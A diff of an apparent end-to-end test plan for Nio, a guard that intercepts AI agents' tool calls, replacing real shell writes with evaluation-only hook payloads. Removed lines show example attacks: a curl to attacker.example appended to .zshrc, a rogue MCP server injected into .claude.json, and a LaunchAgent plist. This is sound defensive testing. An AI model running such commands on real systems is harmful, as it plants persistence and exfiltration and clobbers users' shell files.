@@ -4,6 +4,8 @@
 
 > **⚠️ Sandbox rule:** This task runs entirely inside an ephemeral directory created by `mktemp -d`. It MUST NOT write to any real user path (`~/.zshrc`, `~/.claude.json`, `~/Library/LaunchAgents/`, `~/.nio/`, etc.) under any circumstance. Step 0 sets up the sandbox and snapshots real paths; the final step verifies real paths are byte-for-byte unchanged before cleanup. If anything in your workflow would write `~/...`, rewrite it to `$NIO_E2E_HOME/...` first.
 >
+> **⚠️ Cross-shell variable rule:** Every Bash tool invocation spawns a **fresh shell** — `export NIO_E2E_HOME=...` set in Step 0 does NOT survive to later steps. Step 0 therefore persists the sandbox path to a stable handle file (`/tmp/nio-e2e.handle`). Every later step that touches a sandbox path MUST start by recovering the handle (snippet below). If you blindly run `>> "$NIO_E2E_HOME/.zshrc"` in a fresh shell, `$NIO_E2E_HOME` is empty, the path becomes `/.zshrc`, and a "helpful" agent rewrite to `~/.zshrc` overwrites the user's real shell rc. **This bit a previous run.**
+>
 > **⚠️ Guard-active rule:** This task is meaningless — and dangerous — if Nio's runtime guard is not actually intercepting the agent's tool calls. Step 0.5 runs a behaviour probe that confirms Nio is wired in. If the probe fails, ABORT and report — do not run the rest of the task. Without an active Nio guard, every "deny" prediction in this file is just an unobstructed write.
 
 ## Prerequisites
@@ -40,11 +42,28 @@ Run **exactly** these commands. If any line fails, stop and report — do not pr
 
 ```
 export NIO_E2E_HOME="$(mktemp -d -t nio-e2e)"
-mkdir -p "$NIO_E2E_HOME/sockets" "$NIO_E2E_HOME/Library/LaunchAgents" "$NIO_E2E_HOME/.claude" "$NIO_E2E_HOME/.hermes"
+mkdir -p "$NIO_E2E_HOME/sockets" "$NIO_E2E_HOME/Library/LaunchAgents" "$NIO_E2E_HOME/.claude" "$NIO_E2E_HOME/.hermes" "$NIO_E2E_HOME/.snapshots"
+
+# Persist the sandbox handle so later steps recover it from a fresh shell.
+# Cross-shell variable loss is what made the earlier version of this file
+# unsafe: when $NIO_E2E_HOME wasn't carried over to a subsequent Bash
+# tool call, sensitive-path tests collapsed to relative paths and at
+# least one user had ~/.zshrc clobbered. The handle file is the fix.
+echo "$NIO_E2E_HOME" > /tmp/nio-e2e.handle
+
+# Locate the bundled guard-hook.js — sensitive-path tests pipe
+# synthesized PreToolUse JSON to it for Phase 0-6 evaluation without
+# ever exec-ing the underlying command.
+GUARD_HOOK=""
+for c in "$HOME/.claude/plugins/cache"/*/skills/nio/scripts/guard-hook.js "$HOME/.openclaw/workspace/skills/nio/scripts/guard-hook.js" "$(pwd)/plugins/claude-code/skills/nio/scripts/guard-hook.js"; do
+  [ -f "$c" ] && GUARD_HOOK="$c" && break
+done
+[ -n "$GUARD_HOOK" ] || { echo "ABORT: guard-hook.js not found — run pnpm run build"; exit 1; }
+echo "$GUARD_HOOK" > /tmp/nio-e2e.guard-hook
+echo "Guard hook: $GUARD_HOOK"
 
 # Defence in depth: snapshot every real path the test mentions, so the
 # final verification can detect any accidental real-path write.
-mkdir -p "$NIO_E2E_HOME/.snapshots"
 for f in ~/.zshrc ~/.bashrc ~/.profile ~/.claude.json ~/.nio/config.yaml ~/.hermes/config.yaml; do
   if [ -f "$f" ]; then
     shasum -a 256 "$f" > "$NIO_E2E_HOME/.snapshots/$(echo "$f" | sed 's|/|_|g').sha256"
@@ -57,9 +76,9 @@ export NIO_HOME="$NIO_E2E_HOME"
 cat > "$NIO_E2E_HOME/config.yaml" <<EOF
 guard:
   protection_level: balanced
-  available_tools:
+  permitted_tools:
     mcp: ['HassTurnOn']
-  mcp_endpoints:
+  mcp_servers:
     hass:
       urls:        ['http://localhost:5173/mcp']
       sockets:     ['$NIO_E2E_HOME/sockets/mcp-hass.sock']
@@ -429,41 +448,63 @@ The agent invokes `mcp__hass__HassTurnOn` through the platform's MCP tool surfac
 
 Expected: allow.
 
-## Sensitive-path write protection (must DENY) — sandbox paths only
+## Sensitive-path write protection (must DENY) — evaluation-only
 
-> Nio's `SENSITIVE_FILE_PATHS` matches by path *fragment* (substring), so `$NIO_E2E_HOME/.zshrc` triggers the same `SENSITIVE_PATH` rule as `~/.zshrc`. We use sandbox paths exclusively.
+> **Safety rewrite, 2026-05-01:** an earlier version of these four steps used real shell `>>` redirects against sandbox paths. When the agent's shell lost `$NIO_E2E_HOME` between Bash invocations the path collapsed to a relative one and at least one user had `~/.zshrc` clobbered. These steps now feed a synthesized `Write` envelope to `guard-hook.js` instead — Phase 0–6 evaluates the hypothetical write and prints the verdict. **No real file is written. The path inside the payload is a fictional `/sandbox/never-real/...` string that does not exist anywhere.** `SENSITIVE_FILE_PATHS` matches by fragment, so any path containing `.zshrc`, `.claude.json`, `Library/LaunchAgents/`, or `.bashrc` triggers the rule regardless of prefix.
+>
+> Each step's command is a single Bash block: it recovers the persisted handle, defines `nio_eval`, and calls it once. Subsequent runs do not need to share state.
 
-### Step 40: Write to `<sandbox>/.claude.json` (MCP config fragment)
-
-```
-echo '{"mcpServers":{"evil":{"url":"http://attacker.example/mcp"}}}' > "$NIO_E2E_HOME/.claude.json"
-```
-
-Expected: deny (`SENSITIVE_PATH` — fragment match on `.claude.json`).
-
-### Step 41: Append to `<sandbox>/.zshrc` (persistence channel fragment)
+### Step 40: `.claude.json` fragment (MCP config write)
 
 ```
-echo 'curl http://attacker.example/exfil &' >> "$NIO_E2E_HOME/.zshrc"
+NIO_E2E_HOME="${NIO_E2E_HOME:-$(cat /tmp/nio-e2e.handle 2>/dev/null)}"
+GUARD_HOOK="$(cat /tmp/nio-e2e.guard-hook 2>/dev/null)"
+[ -n "$NIO_E2E_HOME" ] && [ -f "$GUARD_HOOK" ] || { echo "ABORT: re-run Step 0"; exit 1; }
+nio_eval() { local out rc; out=$(printf '%s' "$2" | NIO_HOME="$NIO_E2E_HOME" node "$GUARD_HOOK" 2>&1); rc=$?; case "$rc" in 0) echo "[$1] ALLOW";; 2) echo "[$1] DENY: $out";; *) echo "[$1] OTHER ($rc): $out";; esac; }
+
+nio_eval "sens .claude.json" '{"hook_event_name":"PreToolUse","tool_name":"Write","tool_input":{"file_path":"/sandbox/never-real/.claude.json","content":"placeholder"}}'
 ```
 
-Expected: deny (fragment match on `.zshrc`).
+Expected: DENY (`SENSITIVE_PATH` — fragment match on `.claude.json`).
 
-### Step 42: Write to `<sandbox>/Library/LaunchAgents/com.evil.plist` (macOS persistence)
-
-```
-echo '<plist/>' > "$NIO_E2E_HOME/Library/LaunchAgents/com.evil.plist"
-```
-
-Expected: deny (fragment match on `Library/LaunchAgents/`).
-
-### Step 43: Write to `<sandbox>/.bashrc`
+### Step 41: `.zshrc` fragment
 
 ```
-echo 'echo evil' >> "$NIO_E2E_HOME/.bashrc"
+NIO_E2E_HOME="${NIO_E2E_HOME:-$(cat /tmp/nio-e2e.handle 2>/dev/null)}"
+GUARD_HOOK="$(cat /tmp/nio-e2e.guard-hook 2>/dev/null)"
+[ -n "$NIO_E2E_HOME" ] && [ -f "$GUARD_HOOK" ] || { echo "ABORT: re-run Step 0"; exit 1; }
+nio_eval() { local out rc; out=$(printf '%s' "$2" | NIO_HOME="$NIO_E2E_HOME" node "$GUARD_HOOK" 2>&1); rc=$?; case "$rc" in 0) echo "[$1] ALLOW";; 2) echo "[$1] DENY: $out";; *) echo "[$1] OTHER ($rc): $out";; esac; }
+
+nio_eval "sens .zshrc" '{"hook_event_name":"PreToolUse","tool_name":"Write","tool_input":{"file_path":"/sandbox/never-real/.zshrc","content":"placeholder"}}'
 ```
 
-Expected: deny.
+Expected: DENY (fragment match on `.zshrc`). **Previously this step used a real `>>` redirect — the new form cannot touch any real file under any failure mode.**
+
+### Step 42: `Library/LaunchAgents/` fragment
+
+```
+NIO_E2E_HOME="${NIO_E2E_HOME:-$(cat /tmp/nio-e2e.handle 2>/dev/null)}"
+GUARD_HOOK="$(cat /tmp/nio-e2e.guard-hook 2>/dev/null)"
+[ -n "$NIO_E2E_HOME" ] && [ -f "$GUARD_HOOK" ] || { echo "ABORT: re-run Step 0"; exit 1; }
+nio_eval() { local out rc; out=$(printf '%s' "$2" | NIO_HOME="$NIO_E2E_HOME" node "$GUARD_HOOK" 2>&1); rc=$?; case "$rc" in 0) echo "[$1] ALLOW";; 2) echo "[$1] DENY: $out";; *) echo "[$1] OTHER ($rc): $out";; esac; }
+
+nio_eval "sens LaunchAgents" '{"hook_event_name":"PreToolUse","tool_name":"Write","tool_input":{"file_path":"/sandbox/never-real/Library/LaunchAgents/com.example.plist","content":"<plist/>"}}'
+```
+
+Expected: DENY (fragment match on `Library/LaunchAgents/`).
+
+### Step 43: `.bashrc` fragment
+
+```
+NIO_E2E_HOME="${NIO_E2E_HOME:-$(cat /tmp/nio-e2e.handle 2>/dev/null)}"
+GUARD_HOOK="$(cat /tmp/nio-e2e.guard-hook 2>/dev/null)"
+[ -n "$NIO_E2E_HOME" ] && [ -f "$GUARD_HOOK" ] || { echo "ABORT: re-run Step 0"; exit 1; }
+nio_eval() { local out rc; out=$(printf '%s' "$2" | NIO_HOME="$NIO_E2E_HOME" node "$GUARD_HOOK" 2>&1); rc=$?; case "$rc" in 0) echo "[$1] ALLOW";; 2) echo "[$1] DENY: $out";; *) echo "[$1] OTHER ($rc): $out";; esac; }
+
+nio_eval "sens .bashrc" '{"hook_event_name":"PreToolUse","tool_name":"Write","tool_input":{"file_path":"/sandbox/never-real/.bashrc","content":"placeholder"}}'
+```
+
+Expected: DENY.
 
 ## Final verification
 
